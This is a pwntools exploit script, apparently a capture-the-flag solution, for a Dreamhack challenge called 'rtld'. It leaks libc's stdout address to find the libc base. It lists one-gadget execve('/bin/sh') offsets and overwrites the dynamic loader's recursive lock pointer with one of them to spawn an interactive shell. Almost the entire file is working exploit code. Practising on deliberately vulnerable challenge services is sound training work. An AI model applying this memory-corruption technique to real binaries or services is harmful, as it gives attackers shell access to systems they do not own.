from pwn import *

#p = process('rtld')
p = remote('host1.dreamhack.games', 19556)
elf = ELF('rtld')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc.so.6')
offset_stdout = libc.symbols['_IO_2_1_stdout_']
addr_libc = int(p.recvline().replace('\n', '').split(': ')[1], 16)
log.info('libc: ' + hex(addr_libc))
addr_libc_base = addr_libc - offset_stdout
log.info('libc base: ' + hex(addr_libc_base))
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
addr_rtld_recursive = addr_libc_base + 0x5f0f48
addr_rtld_lock = addr_libc_base + 0x61b968
addr_main = addr_libc_base + libc.symbols['__libc_start_main']
addr_oneshot = addr_libc_base + 0xf02a4

#raw_input('debug: ' + str(p.pid))
p.sendlineafter('addr: ', str(addr_rtld_recursive))
p.sendlineafter('value: ', str(addr_oneshot))

p.interactive()
